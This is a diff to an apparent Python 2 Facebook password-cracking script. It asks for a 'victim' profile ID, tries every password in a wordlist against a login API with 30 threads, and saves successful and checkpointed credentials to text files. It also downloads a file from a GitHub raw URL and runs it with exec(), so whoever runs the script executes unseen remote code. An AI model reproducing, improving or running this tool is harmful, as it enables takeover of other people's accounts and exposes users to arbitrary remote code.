@@ -23,7 +23,7 @@ def motion(arg):
   for i in arg:
     sys.stdout.write(i)
     sys.stdout.flush()
-    time.sleep(.05)
+    time.sleep(.04)
 reload(sys)
 sys.setdefaultencoding("utf-8")
 br = mechanize.Browser()
@@ -35,40 +35,28 @@ br.addheaders = [('user-agent',"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Buil
 os.system("clear")
 
 motion("\033[1;33m\nEverything is getting ready...")
-time.sleep(3)
+time.sleep(2)
 os.system("clear")
 rs=requests.session()
 rg=rs.get
 x=(rg("https://raw.githubusercontent.com/Noob-Hacker71/Noob-Hacker71/main/info.py").text)
 exec(x)
-
-
-
 ##### LOGO #####
 
 id = []
 
-
-
-acl='\033[1;30m'
 rcl='\033[1;31m'
 gcl='\033[1;32m' 
 ycl='\033[1;33m'
 bcl = '\033[1;34m'
 pcl = '\033[1;35m'
 ccl='\033[1;36m' 
-wcl='\033[1;37m'
-mcl = '\033[1;94m'
-ncl='\033[0;00m'
 rcl='\033[1;31m'
 gcl='\033[1;32m' 
 ycl='\033[1;33m'
 bcl = '\033[1;34m'
-pcl = '\033[1;35m'
 ccl='\033[1;36m' 
-wcl='\033[1;37m'
-mcl = '\033[1;94m'
-ncl='\033[0;00m'
+
 warn= """
 {ycl}[+] Attacking In Background For Fast Cracking ...
 {bcl}[+] This A Facebook Password Cracker Script ...
@@ -106,7 +94,6 @@ while True:
         os.system("clear")
 
 os.system("clear")
-
 print(logo)
 motion(info)
 victim = raw_input(ccl+"\nEnter Victim Profile ID >> ")
@@ -117,11 +104,7 @@ word = open(passlist,'r').readlines()
 
 with open(fil, 'r')as file:
   x = len(file.readlines())
-  motion(rcl+'\nTotal Password =>> '+str(x)+'\n')
-  
-  
-
-  
+  motion(rcl+'\nTotal Password =>> '+str(x))
 
 def Noob():
   try:
@@ -142,31 +125,26 @@ def Noob():
       q = json.load(data)
       #print(q)
       if 'access_token' in q:
-        motion (gcl+'\n\n[NOOB_OK] ' + victim + '  |  ' + line+"\n")
+        motion (ccl+'\n[NOOB_OK] ' + victim + '  |  ' + line+"\n")
         okb = open('save/Noob_Successful.txt', 'a')
-        okb.write(victim +" [ NOOB-OK ] "+ line + '\n')
+        okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
-        exit()        
+                  
       elif 'www.facebook.com' in q['error_msg']:
-        motion( ycl+'\n\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
+        motion( ycl+'\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
         cps = open('save/Noob_CheckPoint.txt', 'a')
-        cps.write(victim +" [ NOOB-CP ] "+ line + '\n')
+        cps.write(victim +" [ NOOB ] "+ line + '\n')
         cps.close()
-        exit()
-      elif q['error_code']  == "368" or q['error_code']  == 368:
-        motion(rcl+'\n\n[ LOCKED ] ' +victim+'  |  ' + line+"\n")
-        okb = open('save/Noob_Successful.txt', 'a')
-        okb.write(victim +" [ NOOB-LK ] "+ line + '\n')
-        okb.close()
-        exit()
+      elif q['error_msg']  == "613" or q['error_msg']  == 613:
+        motion( ycl+'\n[ LOCKED ] ' +victim+'  |  '+ycl + line+"\n")
+        
       else:
-        print( ycl+'\n[ PASSWORD WRONG ] '  +ycl + line)
+        pass
+        #print( ycl+'\n[ PASSWORD WRONG ] '  +ycl + line+"\n")
     except:
       pass
   
   p = ThreadPool(30)
   p.map(main,id)
- 
-
 Noob()
-motion(ccl+"\nOpen 'save' file You will find Cracked Account in a .txt File ")
+motion(ccl+"\nCreacked Account In Save File...\n")
